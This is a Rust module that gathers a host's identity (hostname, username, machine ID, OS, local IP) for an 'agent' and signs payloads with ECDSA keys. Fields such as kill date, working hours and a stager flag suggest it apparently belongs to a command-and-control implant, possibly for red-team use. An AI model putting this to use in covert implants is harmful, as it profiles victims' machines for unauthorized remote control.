//! Identity gathering and ECDSA key handling.

use base64::{engine::general_purpose::STANDARD, Engine as _};
use p256::ecdsa::{
    signature::Signer, Signature, SigningKey, VerifyingKey,
};
use p256::pkcs8::{DecodePrivateKey, DecodePublicKey};
use sha2::{Digest, Sha256};

use crate::platform;
use crate::protocol::Identity;

use super::agent::Config;

/// Gather the agent's identity.
pub fn gather_identity(cfg: &Config) -> Identity {
    let hostname = platform::hostname().unwrap_or_default();
    let username = platform::username().unwrap_or_default();
    Identity {
        hostname,
        username,
        machine_id: platform::machine_id(),
        os: std::env::consts::OS.to_string(),
        arch: std::env::consts::ARCH.to_string(),
        proto: 1,
        kill_days: cfg.kill_days as i32,
        work_start: cfg.work_hours_start as i32,
        work_end: cfg.work_hours_end as i32,
        stager: false,
        identity_role: cfg.identity_role.clone(),
        local_addr: local_outbound_addr(),
    }
}

/// Parse a PEM-encoded ECDSA P-256 public key.
pub fn parse_ecdsa_public_key(pem_bytes: &[u8]) -> Option<VerifyingKey> {
    VerifyingKey::from_public_key_pem(
        std::str::from_utf8(pem_bytes).ok()?,
    )
    .ok()
}

/// Parse a PEM-encoded ECDSA P-256 private key (PKCS#8 or SEC1).
pub fn parse_ecdsa_private_key(
    pem_bytes: &[u8],
) -> Result<SigningKey, String> {
    let s = std::str::from_utf8(pem_bytes).map_err(|e| e.to_string())?;
    if let Ok(k) = SigningKey::from_pkcs8_pem(s) {
        return Ok(k);
    }
    if let Ok(k) = SigningKey::from_sec1_pem(s) {
        return Ok(k);
    }
    Err("private key is neither a PKCS#8 nor an SEC1 ECDSA key"
        .to_string())
}

/// Sign `payload` with `priv_key` (SHA-256 + ECDSA, ASN.1 sig).
pub fn sign_payload(
    priv_key: &SigningKey,
    payload: &[u8],
) -> Result<Vec<u8>, String> {
    let digest = Sha256::digest(payload);
    let sig: Signature = priv_key
        .try_sign(&digest)
        .map_err(|e| e.to_string())?;
    Ok(sig.to_der().as_bytes().to_vec())
}

/// Discover the local outbound IP by dialling a dummy UDP socket.
pub fn local_outbound_addr() -> String {
    use std::net::UdpSocket;
    let Ok(sock) = UdpSocket::bind("0.0.0.0:0") else {
        return String::new();
    };
    if sock.connect("8.8.8.8:53").is_err() {
        return String::new();
    }
    sock.local_addr()
        .map(|a| a.ip().to_string())
        .unwrap_or_default()
}

// Silence unused warnings when the call sites are feature-gated.
#[allow(dead_code)]
fn _unused(_: &STANDARD, _: &VerifyingKey) {}